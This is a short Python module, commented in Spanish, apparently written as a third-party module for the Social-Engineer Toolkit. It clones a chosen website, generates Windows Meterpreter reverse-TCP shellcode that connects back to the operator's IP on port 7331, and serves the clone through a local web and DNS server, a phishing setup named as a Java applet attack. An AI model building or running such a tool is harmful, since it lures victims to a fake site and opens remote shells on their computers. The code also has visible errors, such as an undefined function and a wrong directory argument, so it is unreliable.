#!/usr/bin/env python3
# Para ejecutarlo hay que colocarlo en la carpeta /modules, en la carpeta raíz del SET. Se podrá lanzar desde "Third Party Modules".
from src.core.setcore import *
import sys
import argparse
MAIN="Uses core.java_applet_attack"
AUTHOR="b33"

def get_options():
	parser = argparse.ArgumentParser()
	parser.add_argument('-u', '--url', dest='url', help='URL a clonar', required=True)
	parser.add_argument('-d', '--dir', dest='dir', help='Directorio en el que clonar el sitio web', required=True)
	options = parser.parse_args()

	return options

def main():
    options = get_options()
    if options == isEmpty():
        print("No se han introducido opciones.\nUso: -u <http://ejemplo.es> -d <ejemplo/>\nEjecute de nuevo proporcionando los argumentos necesarios.")
    site_cloner(options.url, options.dir, "")
    print(check_os())
    print(meta_path())
    print(meta_database())
    ipaddr = grab_ipaddress()
    if is_valid_ip(ipaddr):
        print(ipaddr + "es válida")

    generate_shellcode("windows/meterpreter/reverse_tcp", ipaddr, "7331")
    print(generate_random_random_string(1, 35))
    start_web_server(dir)
    start_dns()
